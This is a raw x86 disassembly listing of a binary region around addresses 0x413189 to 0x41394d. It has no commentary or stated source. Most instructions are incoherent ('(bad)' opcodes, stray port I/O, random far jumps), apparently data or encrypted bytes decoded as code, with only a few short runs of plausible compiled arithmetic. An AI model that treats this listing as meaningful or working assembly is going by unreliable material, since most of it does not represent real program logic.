  413189:	jmp    0xc914:0xfa8dda7c
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	push   ss
  413192:	out    dx,al
  413193:	ret    
  413194:	push   edx
  413195:	inc    ecx
  413196:	jp     0x4131e5
  413198:	add    BYTE PTR [ecx],bl
  41319a:	xor    DWORD PTR [esi-0x74b908dd],esp
  4131a0:	or     eax,0x77d7e435
  4131a5:	shr    ch,cl
  4131a7:	fcomi  st,st(3)
  4131a9:	jmp    0x41318f
  4131ab:	push   ds
  4131ac:	retf   
  4131ad:	sub    BYTE PTR [ebx],dl
  4131af:	xor    dl,al
  4131b1:	pop    edx
  4131b2:	les    ebx,FWORD PTR [eax+0xa6c3a04]
  4131b8:	jmp    0xfa55c823
  4131bd:	(bad)  
  4131be:	in     eax,dx
  4131bf:	scas   eax,DWORD PTR es:[edi]
  4131c0:	mov    esi,0x3329f6ec
  4131c5:	popf   
  4131c6:	xor    DWORD PTR [ecx],eax
  4131c8:	push   ecx
  4131c9:	push   edi
  4131ca:	inc    ecx
  4131cb:	cmp    eax,esp
  4131cd:	out    dx,al
  4131ce:	rcr    DWORD PTR [edx],0xba
  4131d1:	loopne 0x413181
  4131d3:	aad    0xe7
  4131d5:	(bad)  
  4131d6:	mov    dl,0x44
  4131d8:	xchg   esp,eax
  4131d9:	pop    ebx
  4131da:	call   0x213f:0x4914e831
  4131e1:	les    ebx,FWORD PTR [eax+0x2ff30de5]
  4131e7:	push   es
  4131e8:	lock pusha 
  4131ea:	xchg   DWORD PTR [esi+0x58],esi
  4131ed:	retf   0x26c5
  4131f0:	xchg   ebx,eax
  4131f1:	push   esi
  4131f2:	mov    esp,0xd6a76c82
  4131f7:	ror    BYTE PTR [ecx-0x78],0xa
  4131fb:	in     eax,0x5
  4131fd:	push   es
  4131fe:	jp     0x41326c
  413200:	jne    0x4131a5
  413202:	mov    ds,WORD PTR [ecx+ebx*4+0x7295cd32]
  413209:	fdiv   QWORD PTR [ebx]
  41320b:	cmc    
  41320c:	mov    esp,0x8ff7c1c1
  413211:	cmp    BYTE PTR [edx+0x74506089],dh
  413217:	outs   dx,BYTE PTR ds:[esi]
  413218:	aam    0x43
  41321a:	loopne 0x41326a
  41321c:	jl     0x41325e
  41321e:	test   BYTE PTR [edi+0xca3138f],bh
  413224:	pop    eax
  413225:	pop    ebx
  413226:	xor    BYTE PTR [esi],dh
  413228:	ret    0x6aed
  41322b:	mov    cl,0x82
  41322d:	xchg   BYTE PTR ds:0x81a08a1c,bl
  413233:	adc    cl,BYTE PTR [ebx]
  413235:	cdq    
  413236:	out    dx,al
  413237:	xchg   edi,eax
  413238:	add    al,0x6b
  41323a:	test   eax,0x260d3b4a
  41323f:	lods   al,BYTE PTR ds:[esi]
  413240:	(bad)  
  413241:	dec    esi
  413242:	pop    ss
  413243:	imul   edx,DWORD PTR [esp+edx*4],0x3b
  413247:	in     al,0x9f
  413249:	nop
  41324a:	mov    esp,0xb1773119
  41324f:	pop    esi
  413250:	pop    eax
  413251:	in     al,0x7e
  413253:	pop    eax
  413254:	shl    BYTE PTR [ebx],0x2b
  413257:	adc    ebx,0xb91adb50
  41325d:	cli    
  41325e:	int    0x8e
  413260:	xchg   BYTE PTR [edi],cl
  413262:	jg     0x41322d
  413264:	stc    
  413265:	dec    ebx
  413266:	ja     0x413214
  413268:	push   ds
  413269:	jmp    0x28fcb312
  41326e:	icebp  
  41326f:	dec    ecx
  413270:	mov    ?,WORD PTR ds:0x1e92d92
  413276:	sbb    eax,esp
  413278:	mov    dh,cl
  41327a:	xor    ecx,DWORD PTR [edi-0x52d6cda2]
  413280:	jg     0x413272
  413282:	mov    dl,bh
  413284:	idiv   BYTE PTR ds:0xf42441c3
  41328a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41328b:	scas   eax,DWORD PTR es:[edi]
  41328c:	lea    ebx,[eax-0x311f1f7c]
  413292:	sub    al,0x94
  413294:	lock pop edi
  413296:	inc    edi
  413297:	mov    ebp,0x4191c83f
  41329c:	repz icebp 
  41329e:	jp     0x4132a0
  4132a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132a1:	fst    st(5)
  4132a3:	inc    edi
  4132a4:	inc    edi
  4132a5:	ffree  st(7)
  4132a7:	sbb    eax,0xf8f47e59
  4132ac:	jbe    0x4132b5
  4132ae:	ret    
  4132af:	(bad)  
  4132b0:	inc    eax
  4132b1:	xchg   ecx,eax
  4132b2:	sahf   
  4132b3:	gs scas eax,DWORD PTR es:[edi]
  4132b5:	adc    al,0x72
  4132b7:	aam    0x67
  4132b9:	pop    edx
  4132ba:	dec    esi
  4132bb:	arpl   cx,si
  4132bd:	in     al,0x6c
  4132bf:	or     edi,esp
  4132c1:	inc    edi
  4132c2:	clc    
  4132c3:	sub    al,0x95
  4132c5:	add    DWORD PTR [ebp+0x16],eax
  4132c8:	xchg   edx,eax
  4132c9:	mov    ebx,0x42ec8ea9
  4132ce:	mov    bl,0x55
  4132d0:	xor    eax,0x5a005076
  4132d5:	inc    eax
  4132d6:	test   al,0x96
  4132d8:	shr    DWORD PTR [esi+0x3],cl
  4132db:	mov    gs,eax
  4132dd:	cdq    
  4132de:	cmp    edi,ebp
  4132e0:	push   edx
  4132e1:	retf   0x1089
  4132e4:	and    al,0x63
  4132e6:	repnz shl BYTE PTR [ebp+0x607b70fa],0xa1
  4132ee:	popa   
  4132ef:	test   BYTE PTR [ebx-0xe],ah
  4132f2:	jecxz  0x413342
  4132f4:	jnp    0x413347
  4132f6:	es das 
  4132f8:	pop    edx
  4132f9:	inc    ebp
  4132fa:	leave  
  4132fb:	daa    
  4132fc:	call   0xf58d:0x443a41fb
  413303:	lea    ebx,[ebp-0x5295413c]
  413309:	sbb    BYTE PTR [ebx],0x4a
  41330c:	pop    ss
  41330d:	push   ebx
  41330e:	sbb    al,0x6a
  413310:	pop    es
  413311:	xor    DWORD PTR [ebx-0x5a],esi
  413314:	mov    cl,0xd4
  413316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413317:	cmp    DWORD PTR ds:[esi+0x588efa8f],esi
  41331e:	cs retw 0x4b9d
  413323:	push   ebx
  413324:	fild   WORD PTR [eax-0xd]
  413327:	ins    DWORD PTR es:[edi],dx
  413328:	hlt    
  413329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41332a:	push   ecx
  41332b:	and    DWORD PTR [eax],esp
  41332d:	jns    0x4132cf
  41332f:	retf   
  413330:	nop
  413331:	inc    edx
  413332:	mov    ebx,ebx
  413334:	ret    
  413335:	or     eax,esp
  413337:	std    
  413338:	mov    al,0x34
  41333a:	xor    ebp,esi
  41333c:	ret    0xee02
  41333f:	add    BYTE PTR [eax+0x72],cl
  413342:	lods   eax,DWORD PTR ds:[esi]
  413343:	aad    0x7f
  413345:	pop    es
  413346:	ja     0x413322
  413348:	or     edi,DWORD PTR [ebx]
  41334a:	xchg   edi,eax
  41334b:	adc    dl,BYTE PTR [edx+0x2]
  41334e:	push   eax
  41334f:	jno    0x413334
  413351:	jno    0x4132ef
  413353:	mov    bl,0xa0
  413355:	inc    ecx
  413356:	inc    esi
  413357:	test   DWORD PTR [edx-0x4c7e6cab],ebp
  41335d:	jnp    0x4133db
  41335f:	inc    esp
  413360:	(bad)  
  413361:	gs pop edi
  413363:	mov    ds:0xcc3451ee,eax
  413368:	dec    esi
  413369:	and    eax,0xa1a4274c
  41336e:	inc    edi
  41336f:	stos   DWORD PTR es:[edi],eax
  413370:	out    dx,al
  413371:	adc    al,0xe7
  413373:	and    DWORD PTR [ebp-0x22],esi
  413376:	mov    ebp,0x1b14c2c3
  41337b:	fsubr  DWORD PTR [ecx+edx*1]
  41337e:	adc    eax,ecx
  413380:	mov    dl,0x66
  413382:	fs pop es
  413384:	pop    es
  413385:	mov    ecx,0xda31ae10
  41338a:	sysenter 
  41338c:	sbb    BYTE PTR [esi],0x3e
  41338f:	(bad)  
  413390:	imul   ebp,DWORD PTR [edi-0x57],0x5d
  413394:	je     0x9abc6f40
  41339a:	mov    ecx,0xcc824731
  41339f:	shl    eax,0xc1
  4133a2:	(bad)  
  4133a3:	(bad)  
  4133a4:	push   edi
  4133a5:	shr    ebp,0xda
  4133a8:	or     BYTE PTR [eax-0x2cc0fbe8],ch
  4133ae:	jl     0x4133fe
  4133b0:	into   
  4133b1:	retf   
  4133b2:	std    
  4133b3:	sbb    ebx,DWORD PTR [ebp-0x3e9cdce5]
  4133b9:	addr16 sbb eax,0x98304c28
  4133bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133c0:	and    bh,BYTE PTR [edx-0x742cd8e2]
  4133c6:	aas    
  4133c7:	(bad)  
  4133c9:	out    0xe3,al
  4133cb:	jle    0x413404
  4133cd:	and    ebx,edx
  4133cf:	or     BYTE PTR [ebp-0xc],ch
  4133d2:	jnp    0x4133ab
  4133d4:	fsubr  QWORD PTR [ecx+0x1e431c11]
  4133da:	cmp    esp,0x2e488c27
  4133e0:	xor    eax,0x8e0d5b81
  4133e5:	test   eax,0x433a4d8
  4133ea:	aam    0x8e
  4133ec:	dec    esp
  4133ed:	push   ebp
  4133ee:	call   0x794d4a57
  4133f3:	retf   
  4133f4:	sub    eax,0x80e67c7d
  4133f9:	sbb    bh,BYTE PTR [eax+0x45]
  4133fc:	das    
  4133fd:	and    ecx,DWORD PTR [ecx]
  4133ff:	mov    ds:0x9ac22283,eax
  413404:	rsm    
  413406:	repnz mov eax,ds:0x19bedea0
  41340c:	ret    
  41340d:	dec    esp
  41340e:	cmp    eax,0x9d8a0915
  413413:	gs jle 0x413488
  413416:	icebp  
  413417:	sbb    eax,0xda01a565
  41341c:	xor    al,0x66
  41341e:	or     edi,ebx
  413420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413421:	aaa    
  413422:	jmp    0x4133fe
  413424:	(bad)  
  413425:	mov    al,BYTE PTR [esi+0x46]
  413428:	nop
  413429:	nop
  41342a:	mov    DWORD PTR [bx+di+0x2b],ecx
  41342e:	adc    ah,BYTE PTR [edi]
  413430:	jp     0x413464
  413432:	mov    ch,0xd3
  413434:	adc    al,0xcc
  413436:	dec    ecx
  413437:	enter  0x792,0xcb
  41343b:	test   eax,0xa9c706fe
  413440:	shl    DWORD PTR [esi],1
  413442:	push   es
  413443:	iret   
  413444:	push   ss
  413445:	pop    esi
  413446:	ds cmp al,bh
  413449:	ins    BYTE PTR es:[edi],dx
  41344a:	test   eax,0x9d371b43
  41344f:	cmp    al,0x17
  413451:	shl    DWORD PTR [ebx+ecx*2-0x65],0x8
  413456:	sbb    DWORD PTR [edi],0x1a
  413459:	rol    DWORD PTR [ecx],cl
  41345b:	jo     0x413411
  41345d:	push   0x12
  41345f:	cdq    
  413460:	test   al,0xf
  413462:	in     eax,0x51
  413464:	test   eax,0x388021ec
  413469:	pop    ecx
  41346a:	aas    
  41346b:	inc    esi
  41346c:	mov    ds:0xe21b1fdd,al
  413471:	out    dx,al
  413472:	loope  0x413481
  413474:	xor    BYTE PTR [ecx],0x89
  413477:	dec    esp
  413478:	jbe    0x4134ae
  41347a:	sar    BYTE PTR [edx-0x30],1
  41347d:	xchg   edx,eax
  41347e:	es pop eax
  413480:	adc    al,0x83
  413482:	ins    DWORD PTR es:[edi],dx
  413483:	ficomp WORD PTR [ebx-0x54c91800]
  413489:	pushf  
  41348a:	sbb    dl,BYTE PTR ds:0x5ec564bb
  413490:	test   al,0x7f
  413492:	es cmp eax,0x85b644a4
  413498:	out    dx,eax
  413499:	mov    esp,0x838b78c4
  41349e:	ds mov ecx,0x1540c5e3
  4134a4:	pusha  
  4134a5:	adc    edx,0x9573
  4134ab:	push   0x12613
  4134b0:	push   0xae21daec
  4134b5:	push   edx
  4134b6:	push   eax
  4134b7:	call   0x42206a
  4134bc:	mov    ecx,eax
  4134be:	mov    eax,DWORD PTR [ebp-0x20]
  4134c1:	jmp    0x413899
  4134c6:	or     eax,0x221ac45b
  4134cb:	sbb    ch,BYTE PTR [edx+0x1b]
  4134ce:	jmp    DWORD PTR [edx+0x1a90709f]
  4134d4:	adc    BYTE PTR [esi+0x64],bh
  4134d7:	inc    edx
  4134d8:	sbb    BYTE PTR [eax],bl
  4134da:	stos   BYTE PTR es:[edi],al
  4134db:	adc    bl,BYTE PTR [eax]
  4134dd:	sbb    BYTE PTR [esi-0x3c0611a9],bl
  4134e3:	dec    esp
  4134e4:	push   ss
  4134e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e7:	adc    DWORD PTR [eax],ecx
  4134e9:	(bad)  
  4134ea:	jmp    0x1c64:0x6f6d560b
  4134f1:	sahf   
  4134f2:	cwde   
  4134f3:	xor    cl,BYTE PTR [ecx]
  4134f5:	and    edi,ebp
  4134f7:	xchg   edi,eax
  4134f8:	repz xlat BYTE PTR ds:[ebx]
  4134fa:	mov    ah,0xe7
  4134fc:	pop    ebx
  4134fd:	or     dl,BYTE PTR [edx+0xa52aeb7]
  413503:	mov    cl,0x80
  413505:	pop    ss
  413506:	and    DWORD PTR [ecx],edi
  413508:	xchg   esi,eax
  413509:	jl     0x413562
  41350b:	xor    eax,0xb98aeac5
  413510:	pop    edx
  413511:	and    al,0x8b
  413513:	sub    BYTE PTR [ecx-0x170c422e],dh
  413519:	stc    
  41351a:	std    
  41351b:	not    DWORD PTR [edx+ecx*1+0x79]
  41351f:	dec    edx
  413520:	pop    edi
  413521:	jge    0x4134e8
  413523:	pop    edi
  413524:	es pop ds
  413526:	push   ecx
  413527:	ds jbe 0x41353b
  41352a:	scas   al,BYTE PTR es:[edi]
  41352b:	sbb    eax,0x2bff482e
  413530:	or     ebx,DWORD PTR [ecx-0x2a]
  413533:	ss dec edi
  413535:	outs   dx,BYTE PTR ds:[esi]
  413536:	xor    eax,0xccfaabe0
  41353b:	jo     0x413530
  41353d:	stos   WORD PTR es:[edi],ax
  41353f:	pop    esp
  413540:	vorps  ymm5,ymm4,YMMWORD PTR [ebx]
  413544:	cmc    
  413545:	mul    DWORD PTR [esi-0x1]
  413548:	jmp    0x413523
  41354a:	sar    DWORD PTR [edx+0x5acedcd],cl
  413550:	mov    al,ds:0xd4e67ada
  413555:	repz pop edx
  413557:	sub    al,0x33
  41355a:	ret    0xec94
  41355d:	cmp    eax,0x889da50c
  413562:	sbb    al,0xd0
  413564:	call   0xd4c7:0x7677b881
  41356b:	sar    BYTE PTR gs:[ebx],cl
  41356e:	jg     0x413500
  413570:	jp     0x413565
  413572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413573:	sub    dl,bl
  413575:	fdivr  st,st(7)
  413577:	dec    esi
  413578:	jecxz  0x413543
  41357a:	mov    cl,0x6f
  41357c:	sbb    al,0x10
  41357e:	cdq    
  41357f:	inc    edx
  413580:	jnp    0x41355e
  413582:	ja     0x4135b7
  413584:	mov    ah,0x78
  413586:	jb     0x4135e8
  413588:	mov    eax,ds:0xa67a4d95
  41358d:	(bad)  
  41358e:	hlt    
  41358f:	sahf   
  413590:	jb     0x413568
  413592:	and    BYTE PTR [eax+0x3afce403],bh
  413598:	ror    esi,cl
  41359a:	jle    0x413582
  41359c:	les    edx,FWORD PTR [edi+esi*4]
  41359f:	jnp    0x4135c6
  4135a1:	adc    eax,0x798ff514
  4135a6:	mov    bh,0x6
  4135a8:	outs   dx,DWORD PTR ds:[esi]
  4135a9:	adc    edx,DWORD PTR [esi-0x151c9fd1]
  4135af:	aam    0xde
  4135b1:	inc    esi
  4135b2:	fnsave [ecx+0x7f]
  4135b5:	gs jnp 0x413597
  4135b8:	jbe    0x413566
  4135ba:	dec    edi
  4135bb:	imul   edx,edi,0xb
  4135be:	sub    dl,BYTE PTR [edi-0x5a]
  4135c1:	mov    cl,0xc7
  4135c3:	stos   DWORD PTR es:[edi],eax
  4135c4:	add    cl,dh
  4135c6:	push   ss
  4135c7:	test   BYTE PTR [edx+0x79761a47],bl
  4135cd:	dec    esi
  4135ce:	stc    
  4135cf:	pushf  
  4135d0:	xor    al,0xf4
  4135d2:	(bad)  
  4135d3:	out    0xfc,eax
  4135d5:	mov    ss,WORD PTR [edx-0x4ca901e6]
  4135db:	jbe    0x4135ff
  4135dd:	fs sub bh,ah
  4135e0:	push   esp
  4135e1:	stc    
  4135e2:	outs   dx,DWORD PTR ds:[esi]
  4135e3:	test   eax,0x84ac592c
  4135e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135e9:	sbb    cl,BYTE PTR [ebp-0x23a69563]
  4135ef:	sub    DWORD PTR [edx],ebx
  4135f1:	sub    al,0xf1
  4135f3:	cmp    BYTE PTR [edi-0x36],bh
  4135f6:	push   ebx
  4135f7:	mov    bh,0xd7
  4135fa:	call   0x9441:0xd0dd3178
  413601:	jb     0x4135a2
  413603:	fwait
  413604:	(bad)
  413607:	not    DWORD PTR [ecx-0x6b]
  41360a:	ret    0xad0c
  41360d:	mov    esi,0x76e75f02
  413612:	cmc    
  413613:	bound  ebx,QWORD PTR [ecx]
  413615:	cld    
  413616:	arpl   WORD PTR [esp+ecx*1+0x5d0b48e2],cx
  41361d:	js     0x4135a7
  41361f:	test   al,0x67
  413621:	mov    ebp,0x9548dc48
  413626:	icebp  
  413627:	cmp    DWORD PTR [edx+ebx*4-0x27],edx
  41362b:	cmp    eax,DWORD PTR [edx-0x33]
  41362e:	mov    WORD PTR [ebp-0x5ad3a5],?
  413634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413635:	inc    esp
  413636:	ds scas eax,DWORD PTR es:[edi]
  413638:	adc    BYTE PTR [edx-0x5abb8c23],al
  41363e:	jmp    0xb789e85b
  413643:	rol    DWORD PTR [eax],1
  413645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413646:	mov    BYTE PTR [edx+edi*2-0x75],ch
  41364a:	and    edi,DWORD PTR [edx+0x416ded0f]
  413650:	push   esp
  413651:	jne    0x4136bf
  413653:	or     DWORD PTR ds:0x96060bc,esp
  413659:	enter  0x5bc5,0xdb
  41365d:	ss adc eax,0xb226d7d8
  413663:	pushf  
  413664:	inc    edi
  413665:	xlat   BYTE PTR ds:[ebx]
  413666:	jmp    0x41361a
  413668:	sub    DWORD PTR [edi],edx
  41366a:	stc    
  41366b:	lea    ebp,[edx+0x28a84a41]
  413671:	adc    DWORD PTR [esi],0xffffff99
  413674:	and    DWORD PTR [edx],esp
  413676:	scas   eax,DWORD PTR es:[edi]
  413677:	xor    eax,0xc48fca00
  41367c:	cli    
  41367d:	test   eax,0x41df80d9
  413682:	test   al,bl
  413684:	sbb    BYTE PTR [ebp+ebx*8+0x7dd0c144],0xa4
  41368c:	sub    eax,0x52874ea0
  413691:	int3   
  413692:	mov    edi,0xc4842611
  413697:	add    ah,BYTE PTR [ecx+0x49]
  41369a:	(bad)  [edx+0x16]
  41369d:	sub    DWORD PTR ds:0x73a44523,0x9e5c5f54
  4136a7:	and    al,0x43
  4136a9:	mov    ebp,0xafe59c6d
  4136ae:	fwait
  4136af:	xor    ah,cl
  4136b1:	or     al,0x2f
  4136b3:	scas   al,BYTE PTR es:[edi]
  4136b4:	ficom  WORD PTR [edx-0x4d1d4d33]
  4136ba:	inc    esi
  4136bb:	push   esi
  4136bc:	jne    0x413654
  4136be:	add    al,0xc7
  4136c0:	dec    eax
  4136c1:	psrlq  mm7,QWORD PTR es:[ebx]
  4136c5:	int    0x94
  4136c7:	inc    ecx
  4136c8:	inc    ebx
  4136c9:	xor    ah,BYTE PTR ds:0xe4462f9b
  4136cf:	ins    DWORD PTR es:[edi],dx
  4136d0:	mov    WORD PTR [ebx-0x2e],?
  4136d3:	fwait
  4136d4:	dec    esi
  4136d5:	(bad)  
  4136d6:	dec    ecx
  4136d7:	outs   dx,BYTE PTR ds:[esi]
  4136d8:	test   BYTE PTR [edx+0x8],0xed
  4136dc:	mov    esp,0x4111a63f
  4136e1:	jno    0x413687
  4136e3:	xor    ch,ch
  4136e5:	out    0x96,al
  4136e7:	or     dh,BYTE PTR [ebx+0x60]
  4136ea:	test   BYTE PTR [eax],0xc5
  4136ed:	xor    al,0xc5
  4136ef:	jle    0x413706
  4136f1:	mov    dh,BYTE PTR [eax-0x11]
  4136f4:	hlt    
  4136f5:	and    dh,BYTE PTR [eax]
  4136f7:	shl    DWORD PTR [edi-0x448e776f],1
  4136fd:	(bad)  
  4136fe:	jmp    0x4136a0
  413700:	add    ecx,eax
  413702:	add    DWORD PTR [edx+0x5a],0x42
  413706:	js     0x4136f5
  413708:	das    
  413709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41370a:	inc    eax
  41370b:	arpl   WORD PTR [eax-0x1caf2b05],si
  413711:	repz daa 
  413713:	mov    al,ds:0x21a33f3d
  413718:	outs   dx,BYTE PTR ds:[esi]
  413719:	nop
  41371a:	and    BYTE PTR [edx-0x50],cl
  41371d:	xchg   esp,eax
  41371e:	inc    ebx
  41371f:	call   DWORD PTR [edi-0x1c]
  413722:	mov    bh,0x7b
  413724:	shl    DWORD PTR [ecx+ebx*8],1
  413727:	push   eax
  413728:	jp     0x4136f8
  41372a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41372b:	and    BYTE PTR [eax+esi*4],ah
  41372e:	push   ss
  41372f:	xchg   edi,eax
  413730:	dec    BYTE PTR [edx+0x60]
  413733:	ret    
  413734:	mov    dl,0x77
  413736:	(bad)  
  413737:	out    dx,eax
  413738:	jne    0x413702
  41373a:	(bad)  
  41373b:	arpl   ax,ax
  41373d:	or     eax,edi
  41373f:	dec    esi
  413740:	repnz and BYTE PTR [ebp+0x10128472],ch
  413747:	repz cmp dl,0x10
  41374b:	cmp    al,0x7b
  41374d:	rcr    DWORD PTR [ecx-0x472f3ccd],cl
  413753:	pop    ecx
  413754:	xchg   edx,eax
  413755:	pusha  
  413756:	jp     0x4136f8
  413758:	out    0x5e,al
  41375a:	rcl    DWORD PTR [ebx],1
  41375c:	sub    ah,dl
  41375e:	and    BYTE PTR [di-0x3b],bh
  413762:	xor    BYTE PTR [ebx],ch
  413764:	pusha  
  413765:	and    al,0x2f
  413767:	sbb    bh,BYTE PTR [edi]
  413769:	out    0xd4,eax
  41376b:	pop    ss
  41376c:	add    al,0xd4
  41376e:	hlt    
  41376f:	inc    ecx
  413770:	add    ecx,ebp
  413772:	js     0x413773
  413774:	pop    esi
  413775:	ficom  DWORD PTR [edi]
  413777:	popa   
  413778:	icebp  
  413779:	test   DWORD PTR [ecx-0x773f8a5a],esi
  41377f:	and    eax,0xd71dc82a
  413784:	imul   eax,DWORD PTR [ebp+ecx*2-0x26],0x7eb5157
  41378c:	cli    
  41378d:	sar    BYTE PTR [ebx-0x41],cl
  413790:	adc    DWORD PTR [ecx],ebp
  413792:	jmp    0x2260:0x5f7db073
  413799:	pop    ebp
  41379a:	(bad)  
  41379b:	outs   dx,DWORD PTR ds:[esi]
  41379c:	push   cs
  41379d:	test   BYTE PTR [esi],0xfb
  4137a0:	sbb    eax,ebx
  4137a2:	push   cs
  4137a3:	fucomi st,st(3)
  4137a5:	fsubr  DWORD PTR [edi-0x5ddf63ff]
  4137ab:	xor    eax,0x47627582
  4137b0:	fistp  WORD PTR [edi+0x51662fa1]
  4137b6:	bound  edi,QWORD PTR [ecx+0x64]
  4137b9:	dec    ecx
  4137ba:	stc    
  4137bb:	lods   eax,DWORD PTR ds:[esi]
  4137bc:	add    al,0x72
  4137be:	fdiv   st,st(6)
  4137c0:	shl    DWORD PTR [ecx+ebx*8-0x78c8750a],1
  4137c7:	loope  0x41377a
  4137c9:	(bad)  
  4137ca:	lods   al,BYTE PTR ds:[esi]
  4137cb:	cmp    al,0xc1
  4137cd:	icebp  
  4137ce:	xchg   edx,eax
  4137cf:	sbb    BYTE PTR [edx-0x71],al
  4137d2:	in     al,dx
  4137d3:	popa   
  4137d4:	xor    edi,DWORD PTR [esi]
  4137d6:	mov    ch,0xcf
  4137d8:	cmp    esp,DWORD PTR [ecx+0x67]
  4137db:	nop
  4137dc:	jns    0x41381c
  4137de:	xlat   BYTE PTR ds:[ebx]
  4137df:	push   edx
  4137e0:	sub    eax,0xcf474a5e
  4137e5:	imul   esp,esi,0x71aace98
  4137eb:	not    edx
  4137ed:	test   al,0x67
  4137ef:	(bad)  
  4137f0:	push   DWORD PTR [ecx+0x17]
  4137f3:	imul   BYTE PTR [ebp-0x49b88aa8]
  4137f9:	daa    
  4137fa:	enter  0x8b78,0x47
  4137fe:	sahf   
  4137ff:	les    ecx,FWORD PTR ss:[ebx-0x6a]
  413803:	hlt    
  413804:	push   es
  413805:	cmp    esp,DWORD PTR [ecx]
  413807:	call   FWORD PTR [edx+0x6b]
  41380a:	mov    ebp,0x2b9ac6cc
  41380f:	cdq    
  413810:	mov    ah,0xb5
  413812:	mul    BYTE PTR [edi-0x38620bc3]
  413818:	ins    DWORD PTR es:[edi],dx
  413819:	aas    
  41381a:	jecxz  0x413829
  41381c:	icebp  
  41381d:	mov    ah,0xfb
  41381f:	lods   al,BYTE PTR ds:[esi]
  413820:	cwde   
  413821:	or     al,0x69
  413824:	inc    ecx
  413825:	sub    dh,BYTE PTR [ebx]
  413827:	cs ret 0x97ad
  41382b:	mov    ah,0x34
  41382d:	xor    BYTE PTR [edx+0x526501eb],0x6
  413834:	(bad)  
  413835:	sub    ah,BYTE PTR [ecx]
  413837:	cs retf 0x2b24
  41383b:	(bad)  
  41383d:	adc    al,0x3b
  41383f:	ret    
  413840:	int3   
  413841:	mov    ah,0x73
  413843:	mov    DWORD PTR [edi],ecx
  413845:	sbb    ecx,DWORD PTR ss:[ebp+0x14]
  413849:	sar    BYTE PTR [bx],0xd6
  41384d:	addr16 retf 
  41384f:	out    0xc2,eax
  413851:	jle    0x413877
  413853:	ss mov ah,0x94
  413856:	push   es
  413857:	fisttp DWORD PTR [ebp+esi*8+0x7e0c028f]
  41385e:	das    
  41385f:	add    DWORD PTR [edx],eax
  413861:	sbb    al,BYTE PTR [eax]
  413863:	fld    QWORD PTR [ebp+0x58e23703]
  413869:	jno    0x413891
  41386b:	add    ebx,ebx
  41386d:	cmc    
  41386e:	dec    esp
  41386f:	and    dl,BYTE PTR [eax-0xf]
  413872:	sbb    DWORD PTR ds:0xc8660117,esp
  413878:	mov    cl,0xed
  41387a:	and    bh,0xeb
  41387d:	fwait
  41387e:	ja     0x4138fc
  413880:	and    al,0x61
  413882:	sbb    DWORD PTR [ecx],0x1b
  413885:	dec    edx
  413886:	je     0x41383b
  413888:	or     BYTE PTR [edi-0xb1618c8],ch
  41388e:	mov    bh,0x38
  413890:	lods   al,BYTE PTR ds:[esi]
  413891:	push   edi
  413892:	jge    0x41383d
  413894:	jmp    0x5d8b:0xc0480af0
  41389b:	in     al,0x81
  41389d:	icebp  
  41389e:	mov    ebx,DWORD PTR [ebx]
  4138a0:	add    BYTE PTR [eax],al
  4138a2:	xor    edi,edi
  4138a4:	xor    edx,edi
  4138a6:	add    ecx,eax
  4138a8:	mov    eax,DWORD PTR [ebp+0xc]
  4138ab:	adc    edx,ebx
  4138ad:	mov    DWORD PTR [eax],ecx
  4138af:	mov    DWORD PTR [eax+0x4],edx
  4138b2:	mov    eax,DWORD PTR [ebp-0x30]
  4138b5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4138b8:	mov    edx,0xbdb2
  4138bd:	sub    edx,eax
  4138bf:	mov    eax,DWORD PTR [ebp-0x28]
  4138c2:	mov    ebx,0x4c02
  4138c7:	sbb    ebx,ecx
  4138c9:	mov    ecx,DWORD PTR [ebp-0x24]
  4138cc:	sub    edx,eax
  4138ce:	mov    eax,DWORD PTR [ebp+0xc]
  4138d1:	sbb    ebx,ecx
  4138d3:	jmp    0x413cab
  4138d8:	out    0x56,eax
  4138da:	inc    ecx
  4138db:	jp     0x4138fd
  4138dd:	jp     0x413881
  4138df:	sub    bh,BYTE PTR [edx]
  4138e1:	xchg   edx,eax
  4138e2:	cmp    DWORD PTR [edx-0x6c],ebp
  4138e5:	retf   0x7cc7
  4138e8:	idiv   DWORD PTR [edx]
  4138ea:	sbb    BYTE PTR [eax],bl
  4138ec:	stos   BYTE PTR es:[edi],al
  4138ed:	adc    bl,BYTE PTR [eax]
  4138ef:	sbb    dh,cl
  4138f1:	push   ss
  4138f2:	fsub   st,st(0)
  4138f4:	arpl   WORD PTR [ebx],di
  4138f6:	mov    cl,0x73
  4138f8:	(bad)  
  4138f9:	push   0xff3f0c0b
  4138fe:	test   eax,0x10ffb6bb
  413903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413904:	mov    eax,0x89114df7
  413909:	(bad)  
  41390a:	sub    eax,0xa5279365
  41390f:	mov    ebx,ebx
  413911:	jb     0x413926
  413913:	ja     0x413932
  413915:	xor    DWORD PTR [edx-0x36],edx
  413918:	je     0x4138a3
  41391a:	cmc    
  41391b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41391c:	mov    cs,WORD PTR [eax+0x75]
  41391f:	push   ecx
  413920:	mov    BYTE PTR ds:0x5ec8f928,0x2b
  413927:	dec    esi
  413928:	retf   0x737b
  41392b:	sbb    BYTE PTR [ebx],cl
  41392d:	push   cs
  41392e:	and    BYTE PTR [ebx+0x6a],dl
  413931:	and    dl,ch
  413933:	jge    0x413932
  413935:	je     0x413940
  413937:	rol    eax,0xfd
  41393a:	repz xchg edi,eax
  41393c:	inc    ebx
  41393d:	dec    ecx
  41393e:	pusha  
  41393f:	sbb    bh,BYTE PTR [esi+0x40]
  413942:	mov    esp,0x405a8d61
  413947:	adc    al,0x79
  413949:	cmp    al,0xc9
  41394b:	pop    es
  41394c:	inc    ebx
  41394d:	inc    edx
